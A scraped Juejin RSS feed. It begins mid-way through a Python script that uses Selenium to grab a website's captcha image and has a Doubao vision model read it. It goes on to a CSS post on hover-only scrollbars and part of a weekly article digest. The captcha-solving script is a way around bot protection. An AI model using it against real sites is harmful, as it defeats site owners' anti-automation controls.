<span class="hljs-keyword">from</span> selenium.webdriver.support.ui <span class="hljs-keyword">import</span> WebDriverWait
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> volcenginesdkarkruntime <span class="hljs-keyword">import</span> Ark

start_time= datetime.datetime.now()

<span class="hljs-comment"># 1. 初始化浏览器，获取验证码图片数据</span>
wd = webdriver.Edge()
wd.implicitly_wait(<span class="hljs-number">10</span>)
wd.get(<span class="hljs-string">"[引号内填写你需要获取验证码的url地址]"</span>)

<span class="hljs-comment"># 等待图片可见，获取src</span>
element = WebDriverWait(wd, <span class="hljs-number">10</span>).until(
    EC.visibility_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">"div.captcha&gt;img"</span>))
)
src_data = element.get_attribute(<span class="hljs-string">"src"</span>)

<span class="hljs-keyword">if</span> src_data <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"未获取到验证码图片的src属性！"</span>)
    <span class="hljs-built_in">input</span>(<span class="hljs-string">"回车退出"</span>)
    wd.close()
    exit()

<span class="hljs-comment">#编写AIAPT的基础配置：key值，AIapi接口，模型id</span>
API_KEY = <span class="hljs-string">"【引号内填写你自己的API Key的值】"</span>
BASE_URL = <span class="hljs-string">"https://ark.cn-beijing.volces.com/api/v3"</span>  <span class="hljs-comment">#调用API地址</span>
MODEL_ID = <span class="hljs-string">"doubao-seed-1-8-251228"</span>  <span class="hljs-comment">#使用的大模型id</span>

<span class="hljs-comment">#2.连接鉴权</span>
client = Ark(
    base_url=BASE_URL,
    api_key=API_KEY
)
<span class="hljs-comment">#3.构造对话</span>
messages = [
    {
        <span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>,
        <span class="hljs-string">"content"</span>: [
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span>,
                <span class="hljs-string">"text"</span>: <span class="hljs-string">"直接识别并返回内容，不要回复其他形容"</span>
            },
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"image_url"</span>,
                <span class="hljs-string">"image_url"</span>: {
                    <span class="hljs-string">"url"</span>: <span class="hljs-string">f"<span class="hljs-subst">{src_data}</span>"</span>
                }
            }
        ]
    }
]

response = client.chat.completions.create(
        model=MODEL_ID,
        messages=messages,
        temperature=<span class="hljs-number">0.7</span>,
        max_tokens=<span class="hljs-number">1000</span>
    )

<span class="hljs-comment">#4.解析并打印响应结果</span>
result = response.choices[<span class="hljs-number">0</span>].message.content
<span class="hljs-built_in">print</span>(<span class="hljs-string">"=== API 响应结果 ==="</span>)
<span class="hljs-built_in">print</span>(result)
end_time= datetime.datetime.now()
<span class="hljs-built_in">print</span>(<span class="hljs-string">"结束记时"</span>)
total_time=end_time-start_time
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"代码执行总耗时：<span class="hljs-subst">{total_time}</span>"</span>) 
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"总耗时（秒）：<span class="hljs-subst">{total_time.total_seconds()}</span>"</span>) 
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"开始时间：<span class="hljs-subst">{start_time.strftime(<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>)}</span>"</span>) 
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"结束时间：<span class="hljs-subst">{end_time.strftime(<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>)}</span>"</span>) 

<span class="hljs-comment">#5.暂停退出</span>
<span class="hljs-built_in">input</span>(<span class="hljs-string">"回车退出"</span>)
wd.close()

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[拯救UI美感！纯CSS实现「幽灵」滚动条：悬停显示、贴边优雅]]></title>    <link>https://juejin.cn/post/7603195960254136320</link>    <guid>https://juejin.cn/post/7603195960254136320</guid>    <pubDate>2026-02-05T09:59:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254136320" data-draft-id="7602991346585239586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="拯救UI美感！纯CSS实现「幽灵」滚动条：悬停显示、贴边优雅"/> <meta itemprop="keywords" content="前端,CSS"/> <meta itemprop="datePublished" content="2026-02-05T09:59:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="人间二两风"/> <meta itemprop="url" content="https://juejin.cn/user/2709615662139614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            拯救UI美感！纯CSS实现「幽灵」滚动条：悬停显示、贴边优雅
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2709615662139614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    人间二两风
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:59:42.000Z" title="Thu Feb 05 2026 09:59:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>浏览器系统默认的滚动条样式又粗又黑，非常影响观感，为此特意做了一版样式优化。</p>
<p>实现以下需求：</p>
<ol>
<li>默认不显示，鼠标移入滑动范围内才显示。（保证页面无需滑动时不臃肿）；</li>
<li>使用简单，添加到全局样式中后，使用时只需在class中添加类名即可。；</li>
<li>滚动条贴边（需要div内部样式准确）；</li>
<li>调整粗细和颜色，增强使用体验！</li>
</ol>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-class">.commonScroll</span> {
  <span class="hljs-attribute">scrollbar-color</span>: transparent transparent;
  <span class="hljs-attribute">scrollbar-width</span>: <span class="hljs-number">8px</span>;

  &amp; ::-webkit-scrollbar-thumb,
  &amp;::-webkit-scrollbar-thumb {
    <span class="hljs-attribute">background-color</span>: transparent;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;

    &amp;:horizontal {
      <span class="hljs-attribute">background-color</span>: transparent;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;
    }
  }

  &amp;<span class="hljs-selector-pseudo">:hover</span> {
    <span class="hljs-attribute">scrollbar-color</span>: <span class="hljs-built_in">var</span>(--g-scroll-bar-color) transparent;

    &amp; ::-webkit-scrollbar-thumb,
    &amp;::-webkit-scrollbar-thumb {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--g-scroll-bar-color);
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;

      &amp;:horizontal {
        <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--g-scroll-bar-color);
        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;
      }
    }
  }

  &amp; ::-webkit-scrollbar-track,
  &amp;::-webkit-scrollbar-track {
    <span class="hljs-attribute">background-color</span>: transparent;
  }
}


<span class="hljs-comment">//  dark.css:    --g-scroll-bar-color:  #565657;</span>
<span class="hljs-comment">// light.css:    --g-scroll-bar-color: #CACBCC;</span>

</code></pre>
<p>使用时</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"searchWrapper  commonScroll"</span>&gt;</span>
</code></pre>
<p>最终效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c1c7d8b69844adbb9ae901376f4acf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq66Ze05LqM5Lik6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890530&amp;x-signature=MfqRzVeWGeo0L4ue%2BnmRnjQYnng%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[分享前端项目常用的三个Skills--Vue、React 与 UI 核心 Skills | 掘金一周 2.5]]></title>    <link>https://juejin.cn/post/7603160727717609523</link>    <guid>https://juejin.cn/post/7603160727717609523</guid>    <pubDate>2026-02-05T08:40:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727717609523" data-draft-id="7602935146707337262" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="分享前端项目常用的三个Skills--Vue、React 与 UI 核心 Skills | 掘金一周 2.5"/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2026-02-05T08:40:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="掘金一周"/> <meta itemprop="url" content="https://juejin.cn/user/53218623894222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            分享前端项目常用的三个Skills--Vue、React 与 UI 核心 Skills | 掘金一周 2.5
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/53218623894222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    掘金一周
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T08:40:11.000Z" title="Thu Feb 05 2026 08:40:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><em>本文字数1500+ ，阅读时间大约需要 4分钟。</em></p>
<blockquote>
<p>【掘金一周】本期亮点：</p>
</blockquote>
<ul>
<li>
<p><a href="https://juejin.cn/post/7599641289887055918" target="_blank" title="https://juejin.cn/post/7599641289887055918">分享前端项目常用的三个Skills--Vue、React 与 UI 核心 Skills</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7598921649888968731" target="_blank" title="https://juejin.cn/post/7598921649888968731">供应链系统中的 Web 打印方案的探索实践</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7600238071038197769" target="_blank" title="https://juejin.cn/post/7600238071038197769">Clawdbot 完整对接飞书教程 手把手搭建你的专属 AI 助手</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7598737609494855699" target="_blank" title="https://juejin.cn/post/7598737609494855699">血压飙升，Flutter &amp; Dart 2025 年度巨坑回顾</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7599970244786864191" target="_blank" title="https://juejin.cn/post/7599970244786864191">从零开始搭建部署 Moltbot/Clawdbot 完整攻略</a></p>
</li>
</ul>
<blockquote>
<p><strong>「上榜规则」</strong>：文章发布时间在本期「掘金一周」发布时间的前一周内；且符合各个栏目的内容定位和要求。 如发现文章有抄袭、洗稿等违反社区规则的行为，将取消当期及后续上榜资格。</p>
</blockquote>
<h2 data-id="heading-0">一周“金”选</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73d5bf990a124e3a87cffb06443ad9ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5LiA5ZGo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770885743&amp;x-signature=pvexyGP3pjpEg0Fli4%2Fh4yfoMXQ%3D" alt="掘金一周 文章头图 1303x734.jpg" loading="lazy"/></p>
<p><em>内容评审们会在过去的一周内对社区深度技术好文进行挖掘和筛选，优质的技术文章有机会出现在下方榜单中，排名不分先后。</em></p>
<h3 data-id="heading-1">前端</h3>
<p><a href="https://juejin.cn/post/7599641289887055918" target="_blank" title="https://juejin.cn/post/7599641289887055918">分享前端项目常用的三个Skills--Vue、React 与 UI 核心 Skills</a><a href="https://juejin.cn/user/598569647873805/posts" target="_blank" title="https://juejin.cn/user/598569647873805/posts">@去伪存真</a></p>
<blockquote>
<p>文章介绍前端项目常用技能包。Vue-Skills 解决 Vue 3 开发痛点；React-Skills 涵盖组件组合、性能优化等规则；UI-Skills 提供多元风格、适配多技术栈。Skills 让开发者转变角色，提升开发效率与代码质量。</p>
</blockquote>
<p><a href="https://juejin.cn/post/7598921649888968731" target="_blank" title="https://juejin.cn/post/7598921649888968731">供应链系统中的 Web 打印方案的探索实践</a><a href="https://juejin.cn/user/3233040624266695/posts" target="_blank" title="https://juejin.cn/user/3233040624266695/posts">@古茗前端团队</a></p>
<blockquote>
<p>本文围绕供应链系统中的Web打印方案展开。调研了基于DOM、可视化模板、本地打印控件三类主流方案并对比。重点分析window.print，给出指定区域与批量打印思路，介绍核心CSS打印配置，指出其仍是高性价比方案。</p>
</blockquote>
<p><a href="https://juejin.cn/post/7599586891084726306" target="_blank" title="https://juejin.cn/post/7599586891084726306">我接手了一个 10 年前的 jQuery 老项目，用 Web Components 给它续了命</a><a href="https://juejin.cn/user/3878732754331096/posts" target="_blank" title="https://juejin.cn/user/3878732754331096/posts">@ErpanOmer</a></p>
<blockquote>
<p>作者接手 2015 年上线的 jQuery 老 CRM 项目，需添加 AI 智能客服功能。因业务时间紧，选择 Web Components，利用其 Shadow DOM 解决 CSS 污染。介绍组件定义与使用，该方案侵入性零、框架无关、可渐进迁移，还给出避坑指南。</p>
</blockquote>
<p><a href="https://juejin.cn/post/7600581247020253193" target="_blank" title="https://juejin.cn/post/7600581247020253193">手把手教你使用LangChain（前端开发程序员版）</a><a href="https://juejin.cn/user/2788017220891128/posts" target="_blank" title="https://juejin.cn/user/2788017220891128/posts">@前端小豆</a></p>
<blockquote>
<p>本文是面向前端开发者的LangChain教程。先介绍前置准备，接着从环境搭建、核心功能实操、前端项目集成展开教学，还给出避坑指南，最后指明进阶方向，助前端开发者用JS/TS集成AI能力，打造智能应用。</p>
</blockquote>
<h3 data-id="heading-2">后端</h3>
<p><a href="https://juejin.cn/post/7600238071038197769" target="_blank" title="https://juejin.cn/post/7600238071038197769">Clawdbot 完整对接飞书教程 手把手搭建你的专属 AI 助手</a><a href="https://juejin.cn/user/993614242266077/posts" target="_blank" title="https://juejin.cn/user/993614242266077/posts">@BingoGo</a></p>
<blockquote>
<p>本文是 Moltbot（原 Clawdbot）对接飞书的教程。先介绍在 Linux 系统安装，包括 Git、Node.js 及 Moltbot 安装步骤，还提及查看服务和访问 Web UI 面板方法。接着说明对接飞书流程，含插件安装、参数配置、权限设置等，完成后可与机器人对话。</p>
</blockquote>
<p><a href="https://juejin.cn/post/7600994087588053011" target="_blank" title="https://juejin.cn/post/7600994087588053011">Agent Skills工作流：从入门到实战</a><a href="https://juejin.cn/user/694547077666606/posts" target="_blank" title="https://juejin.cn/user/694547077666606/posts">@雨中飘荡的记忆</a></p>
<blockquote>
<p>本文围绕Agent Skills工作流展开，先介绍核心概念与架构设计，接着阐述核心组件、基础技能实现，还涉及交互机制、多Agent协作。以智能数据分析系统为例实战，给出部署、测试策略与设计原则，展现其结合AI与传统开发的优势。</p>
</blockquote>
<p><a href="https://juejin.cn/post/7599237603976134699" target="_blank" title="https://juejin.cn/post/7599237603976134699">性能告警惊四座 神器出手伏恶龙</a><a href="https://juejin.cn/user/2586510420095944/posts" target="_blank" title="https://juejin.cn/user/2586510420095944/posts">@Hello_world_</a></p>
<blockquote>
<p>2025年12月29日服务出现CPU阈值告警，作者从代码、流量、JVM维度排查，未找到根本原因。后用神器Arthas分析，发现是业务代码中序列化/反序列化代码使用不当所致。修改代码后，CPU利用率大幅降低。</p>
</blockquote>
<h3 data-id="heading-3">Android</h3>
<p><a href="https://juejin.cn/post/7598737609494855699" target="_blank" title="https://juejin.cn/post/7598737609494855699">血压飙升，Flutter &amp; Dart 2025 年度巨坑回顾</a><a href="https://juejin.cn/user/817692379985752/posts" target="_blank" title="https://juejin.cn/user/817692379985752/posts">@恋猫de小郭</a></p>
<blockquote>
<p>本文先提及 Google 发布的 Flutter &amp; Dart 2025 高光回顾，随后着重盘点该年 Flutter 经典巨坑，如宏功能暂停、线程合并问题等，其中超半数为 iOS 相关问题，虽官方积极解决，但平台升级坑多。</p>
</blockquote>
<p><a href="https://juejin.cn/post/7600787795478134830" target="_blank" title="https://juejin.cn/post/7600787795478134830">Compose中的IntrinsicSize实战指南</a><a href="https://juejin.cn/user/2788017216685784/posts" target="_blank" title="https://juejin.cn/user/2788017216685784/posts">@稀有猿诉</a></p>
<blockquote>
<p>本文围绕Compose中的IntrinsicSize展开，以构建重叠卡片式UI为例，指出weight修饰符导致布局问题的原因，介绍了IntrinsicSize打破循环依赖的原理，列举常见用例，还提及性能注意事项，强调其对复杂UI构建的重要性。</p>
</blockquote>
<h3 data-id="heading-4">人工智能</h3>
<p><a href="https://juejin.cn/post/7599970244786864191" target="_blank" title="https://juejin.cn/post/7599970244786864191">从零开始搭建部署 Moltbot/Clawdbot 完整攻略</a><a href="https://juejin.cn/user/4388906150921614/posts" target="_blank" title="https://juejin.cn/user/4388906150921614/posts">@出门不下雨</a></p>
<blockquote>
<p>本文是 Moltbot/Clawdbot 搭建部署攻略。介绍其为支持多模型、多平台的 AI 助手框架，阐述系统要求，给出 Windows、Mac 安装步骤，涵盖首次配置、常用指令、日常维护、故障排除及进阶配置内容，还解答常见问题。</p>
</blockquote>
<p><a href="https://juejin.cn/post/7599604510366236710" target="_blank" title="https://juejin.cn/post/7599604510366236710">Agent Skills 傻瓜式教程，26 年最火 AI 技术就这？</a><a href="https://juejin.cn/user/2444938365386621/posts" target="_blank" title="https://juejin.cn/user/2444938365386621/posts">@程序员鱼皮</a></p>
<blockquote>
<p>本文围绕 Agent Skills 展开，它是 Anthropic 推出的开放标准，可让 AI 学习专业技能。介绍了入门实战、内部原理、跨工具使用、创建方法，还对比了与 MCP、斜杠命令区别，因其开放复用且降低门槛而大火。</p>
</blockquote>
<p><a href="https://juejin.cn/post/7598918127578972194" target="_blank" title="https://juejin.cn/post/7598918127578972194">Agent Skills完全指南：核心概念丨设计模式丨实战代码</a><a href="https://juejin.cn/user/3140624091453053/posts" target="_blank" title="https://juejin.cn/user/3140624091453053/posts">@大模型真好玩</a></p>
<blockquote>
